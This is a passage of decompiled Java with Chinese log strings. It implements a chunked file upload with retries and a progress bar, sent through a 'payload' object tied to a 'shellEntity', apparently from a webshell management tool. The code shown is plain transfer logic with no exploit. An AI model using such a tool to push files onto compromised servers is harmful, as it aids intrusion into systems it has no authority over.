      Log.log(String.format("大文件上传开始 src:%s dest:%s 文件大小:%d 上传大小:%d", new Object[] { selectdFile.getAbsolutePath(), uploadFileString, Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
      
      label23: while ((readLen = fileInputStream.read(readData)) != -1) {
        result = Arrays.copyOfRange(readData, 0, readLen);
        while (true) {
          try {
            if (errorNum < bigFileErrorRetryNum) {
              if (httpProgressBar.isClose()) {
                Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
                fileInputStream.close();
                GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已强制关闭", "提示", 0);
                httpProgressBar.close();
                return false;
              } 
              
              Thread.sleep(bigFileSendRequestSleep);
              String flag = this.payload.bigFileUpload(uploadFileString, cuurentOffset, result);
              if ("ok".equals(flag)) {
                errorNum = 0;
                cuurentOffset += readLen;
                httpProgressBar.setValue(cuurentOffset);
                continue label23;
              } 
              Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
              httpProgressBar.close();
              GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), flag, "提示", 0);
              fileInputStream.close();
              return false;
            } 
            
            Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
            httpProgressBar.close();
            GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "错误次数超限", "提示", 0);
            fileInputStream.close();
            return false;
          }
          catch (Exception e) {
            errorNum++;
            Log.error(e);
            Thread.sleep(500L);
          } 
        } 
      } 
      fileInputStream.close();
      Log.log("大文件上传结束 src:%s dest:%s 文件大小:%d 上传大小:%d", new Object[] { selectdFile.getAbsolutePath(), uploadFileString, Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) });
      httpProgressBar.close();
      return true;
    }
    catch (Exception e) {
      Log.error(e);
      GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), e.getMessage(), "错误提示", 0);
      return false;
    } 
  }
}
